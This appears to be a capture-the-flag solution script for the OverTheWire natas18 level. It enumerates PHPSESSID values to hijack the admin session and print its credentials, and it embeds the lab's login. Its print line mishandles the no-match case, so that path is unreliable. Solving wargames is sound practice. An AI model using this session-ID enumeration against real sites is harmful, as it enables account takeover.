import urllib.request, base64, re
# natas18: PHPSESSID = rand(1,640) (plain ints); the admin session prints the
# credentials. Just try every id.
url = "http://natas18.natas.labs.overthewire.org/"
auth = "Basic " + base64.b64encode(b"natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op").decode()
for sid in range(1, 641):
    r = urllib.request.Request(url, headers={"Authorization": auth, "Cookie": f"PHPSESSID={sid}"})
    body = urllib.request.urlopen(r, timeout=15).read().decode("utf-8", "replace")
    if "Password:" in body:
        m = re.search(r"Username: (\w+)\s*Password: (\w+)", body)
        print("ADMIN session", sid, m.group(1), m.group(2) if m else body)
        break
else:
    print("no admin session found")

